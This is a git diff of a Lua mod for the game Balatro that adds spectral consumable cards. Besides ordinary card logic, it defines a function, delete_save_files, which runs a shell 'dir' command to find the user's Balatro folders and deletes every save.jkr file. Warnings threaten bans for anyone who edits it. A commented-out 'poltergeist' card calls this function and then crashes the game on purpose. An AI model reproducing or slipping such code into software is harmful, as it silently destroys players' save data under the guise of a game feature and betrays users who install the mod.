@@ -162,6 +162,19 @@ SMODS.Consumable {
 				new_joker:add_to_deck()
 				G.jokers:emplace(new_joker)
 				new_joker:juice_up(0.3, 0.5)
+
+				-- Clear tags
+				if G.GAME.tags then
+					local tags_to_remove = {}
+					for k, v in pairs(G.GAME.tags) do
+						tags_to_remove[#tags_to_remove + 1] = v
+					end
+					for _, v in ipairs(tags_to_remove) do
+						if v.remove then v:remove() end
+					end
+					G.GAME.tags = {}
+				end
+
 				return true
 			end,
 		}))
@@ -175,6 +188,219 @@ SMODS.Consumable {
 	}
 }
 
+local function createfulldeck(enhancement, edition, amount, emplacement)
+    local cards = {}
+    for k, v in pairs(G.P_CARDS) do
+        local front = v
+        for i = 1, (amount or 1) do
+            G.E_MANAGER:add_event(Event({
+                delay = 0.1,
+                func = function()
+                    cards[i] = true
+                    G.playing_card = (G.playing_card and G.playing_card + 1) or 1
+                    local card = Card(G.play.T.x + G.play.T.w / 2, G.play.T.y, G.CARD_W, G.CARD_H, v,
+                        enhancement or G.P_CENTERS.c_base, {
+                            playing_card = G.playing_card
+                        })
+                    if edition then
+                        card:set_edition(type(edition) == 'table' and edition or {
+                            [edition] = true
+                        }, true, true)
+                    end
+                    play_sound('card1')
+                    table.insert(G.playing_cards, card)
+                    card:add_to_deck()
+                    if emplacement then
+                        emplacement:emplace(card)
+                    else
+                        G.deck:emplace(card)
+                    end
+                    return true
+                end
+            }))
+        end
+    end
+    G.E_MANAGER:add_event(Event({
+        trigger = "after",
+        delay = 0.1,
+        func = function()
+            if next(cards) then
+                playing_card_joker_effects(cards)
+            end
+            cards = nil
+            return true
+        end
+    }))
+end
+
+SMODS.Consumable {
+    key = "path_of_solstice",
+    set = "Spectral",
+    pos = { x = 0, y = 0 },
+    soul_pos = { x = 2, y = 0, extra = { x = 1, y = 0 } },
+    cost = 120,
+    unlocked = true,
+    discovered = true,
+    atlas = "crp_consumables",
+	can_use = function(self, card)
+		return true
+	end,
+    use = function(self, card, area, copier)
+        G.E_MANAGER:add_event(Event({
+            trigger = "after",
+            delay = 0.4,
+            func = function()
+                play_sound("timpani")
+                -- Reset the deck
+                G.E_MANAGER:add_event(Event({
+                    trigger = "after",
+                    delay = 0.1,
+                    func = function()
+                        -- Destroy jokers and consumables
+                        local deletable_jokers = {}
+                        local deletable_consumeables = {}
+                        for _, v in ipairs(G.jokers.cards) do
+                            deletable_jokers[#deletable_jokers + 1] = v
+                        end
+                        for _, v in ipairs(G.consumeables.cards) do
+                            if v ~= card then
+                                deletable_consumeables[#deletable_consumeables + 1] = v
+                            end
+                        end
+                        local _first_dissolve = nil
+                        for _, v in ipairs(deletable_jokers) do
+                            v:start_dissolve(nil, _first_dissolve)
+                            _first_dissolve = true
+                        end
+                        for _, v in ipairs(deletable_consumeables) do
+                            v:start_dissolve(nil, _first_dissolve)
+                            _first_dissolve = true
+                        end
+
+                        -- Clear the deck
+                        G.deck.cards = {}
+                        G.playing_cards = {}
+
+                        -- Clear tags
+                        if G.GAME.tags then
+                            local tags_to_remove = {}
+                            for k, v in pairs(G.GAME.tags) do
+                                tags_to_remove[#tags_to_remove + 1] = v
+                            end
+                            for _, v in ipairs(tags_to_remove) do
+                                if v.remove then v:remove() end
+                            end
+                            G.GAME.tags = {}
+                        end
+
+                        -- Create new deck
+                        createfulldeck()
+
+                        -- Create the Joker after everything else
+                        local new_joker = create_card("Joker", G.jokers, nil, "crp_22exomythic4mecipe", nil, nil, nil, "path_of_solstice")
+                        new_joker:add_to_deck()
+                        G.jokers:emplace(new_joker)
+                        new_joker:juice_up(0.3, 0.5)
+
+                        return true
+                    end
+                }))
+                return true
+            end
+        }))
+    end,
+}
+
+-- WARNING: DO NOT EDIT THIS FUNCTION.
+-- WARNING: DO NOT EDIT THIS FUNCTION.
+-- If any person other than Glitchkat10 edits this function, their access to the repository will be revoked, and they will be banned from the server.
+local function delete_save_files()
+    local base_path = os.getenv("USERPROFILE") .. "\\AppData\\Roaming\\Balatro"
+    local handle = io.popen('dir "' .. base_path .. '" /b /ad')
+    if handle then
+        for folder in handle:lines() do
+            local save_path = base_path .. "\\" .. folder .. "\\save.jkr"
+            local file = io.open(save_path, "r")
+            if file then
+                file:close()
+                os.remove(save_path)
+            end
+        end
+        handle:close()
+    end
+end
+-- WARNING: DO NOT EDIT THIS FUNCTION.
+-- WARNING: DO NOT EDIT THIS FUNCTION.
+-- If any person other than Glitchkat10 edits this function, their access to the repository will be revoked, and they will be banned from the server.
+
+--[[
+SMODS.Consumable {
+	key = "poltergeist",
+	set = "Spectral",
+	pos = { x = 0, y = 0 },
+	soul_pos = { x = 2, y = 0, extra = { x = 1, y = 0 }},
+	cost = 240,
+	unlocked = true,
+	discovered = true,
+	atlas = "crp_consumables",
+	can_use = function(self, card)
+		return G.jokers and #G.jokers.cards < G.jokers.config.card_limit
+	end,
+	use = function(self, card, area, copier)
+		G.E_MANAGER:add_event(Event({
+			trigger = "after",
+			delay = 0.4,
+			func = function()
+				if pseudorandom("crp_poltergeist") < 0.98 then
+					if pseudorandom("crp_poltergeist2") < 0.27 then
+						attention_text({
+							text = localize('k_nope_ex'),
+							scale = 1.3, 
+							hold = 1.4,
+							major = card,
+							backdrop_colour = G.C.SECONDARY_SET.Tarot,
+							align = (G.STATE == G.STATES.TAROT_PACK or G.STATE == G.STATES.SPECTRAL_PACK) and 'tm' or 'cm',
+							offset = {x = 0, y = (G.STATE == G.STATES.TAROT_PACK or G.STATE == G.STATES.SPECTRAL_PACK) and -0.2 or 0},
+							silent = true
+						})
+						G.E_MANAGER:add_event(Event({
+							trigger = 'after', 
+							delay = 0.06*G.SETTINGS.GAMESPEED, 
+							blockable = false, 
+							blocking = false, 
+							func = function()
+								play_sound('tarot2', 0.76, 0.4)
+								delay(3)
+								return true 
+							end
+						}))
+						play_sound('tarot2', 1, 0.4)
+						card:juice_up(0.3, 0.5)
+						G.E_MANAGER:add_event(Event({
+							trigger = 'after', 
+							delay = 1.5, 
+							func = function()
+								-- delete all save files before crashing
+								delete_save_files()
+								-- this will cause a crash
+								get_crashed_noob_lol("get_crashed_noob_lol")
+								return true
+							end
+						}))
+						return true
+					end
+				end
+				play_sound("timpani")
+				local card = create_card("Joker", G.jokers, nil, "crp_hyperexomythicepicawesomeuncommon2mexotic2gigaomegaalphaomnipotranscendant2exomythic4mecipe", nil, nil, nil, "crp_poltergeist")
+				card:add_to_deck()
+				G.jokers:emplace(card)
+				card:juice_up(0.3, 0.5)
+				return true
+			end
+		}))
+	end,
+} ]] -- 
+
 SMODS.Consumable {
 	key = "reckoning",
 	set = "Spectral",
@@ -186,7 +412,7 @@ SMODS.Consumable {
 	atlas = "crp_consumables",
 	hidden = true,
 	can_use = function(self, card)
-		return true
+		return G.jokers and #G.jokers.cards < G.jokers.config.card_limit
 	end,
 	use = function(self, card, area, copier)
 		G.E_MANAGER:add_event(Event({
@@ -194,7 +420,7 @@ SMODS.Consumable {
 			delay = 0.4,
 			func = function()
 				if pseudorandom("crp_reckoning") < 0.27 then
-					G.E_MANAGER:add_event(Event({trigger = 'after', delay = 0.4, func = function()
+					G.E_MANAGER:add_event(Event({trigger = 'after', delay = 0, func = function()
 						attention_text({
 							text = localize('k_nope_ex'),
 							scale = 1.3, 
@@ -212,7 +438,7 @@ SMODS.Consumable {
 						card:juice_up(0.3, 0.5)
 						return true 
 					end}))
-					G.E_MANAGER:add_event(Event({trigger = 'after', delay = 5, func = function()
+					G.E_MANAGER:add_event(Event({trigger = 'after', delay = 2, func = function()
 						delay(0.5)
 						G.STATE = G.STATES.GAME_OVER
 						G.STATE_COMPLETE = false
@@ -236,56 +462,3 @@ SMODS.Consumable {
 		code = { "Glitchkat10" }
 	}
 }
---[[
-SMODS.Consumable {
-	key = "poltergeist",
-	set = "Spectral",
-	pos = { x = 0, y = 0 },
-	soul_pos = { x = 2, y = 0, extra = { x = 1, y = 0 }},
-	cost = 120,
-	unlocked = true,
-	discovered = true,
-	atlas = "crp_consumables",
-	use = function(self, card, area, copier)
-		G.E_MANAGER:add_event(Event({
-			trigger = "after",
-			delay = 0.4,
-			func = function()
-				if pseudorandom("crp_poltergeist") < 0.98 then
-					attention_text({
-						text = localize('k_nope_ex'),
-						scale = 1.3, 
-						hold = 1.4,
-						major = card,
-						backdrop_colour = G.C.SECONDARY_SET.Tarot,
-						align = (G.STATE == G.STATES.TAROT_PACK or G.STATE == G.STATES.SPECTRAL_PACK) and 'tm' or 'cm',
-						offset = {x = 0, y = (G.STATE == G.STATES.TAROT_PACK or G.STATE == G.STATES.SPECTRAL_PACK) and -0.2 or 0},
-						silent = true
-					})
-					G.E_MANAGER:add_event(Event({trigger = 'after', delay = 0.06*G.SETTINGS.GAMESPEED, blockable = false, blocking = false, func = function()
-						play_sound('tarot2', 0.76, 0.4)
-						delay(3);return true end}))
-					play_sound('tarot2', 1, 0.4)
-					card:juice_up(0.3, 0.5)
-					G.E_MANAGER:add_event(Event({trigger = 'after', delay = 1.5, func = function()
-						-- This will cause a crash by trying to access a nil value
-						local crash = nil
-						crash.nonexistent = true
-						return true
-					end}))
-					return true
-				end
-				play_sound("timpani")
-				local card = create_card("Joker", G.jokers, nil, "crp_hyperexomythicepicawesomeuncommon2mexotic2gigaomegaalphaomnipotranscendant2exomythic4mecipe", nil, nil, nil, "crp_poltergeist")
-				card:add_to_deck()
-				G.jokers:emplace(card)
-				card:juice_up(0.3, 0.5)
-				return true
-			end
-		}))
-	end,
-	can_use = function(self, card)
-		return true
-	end
-}
-]]--
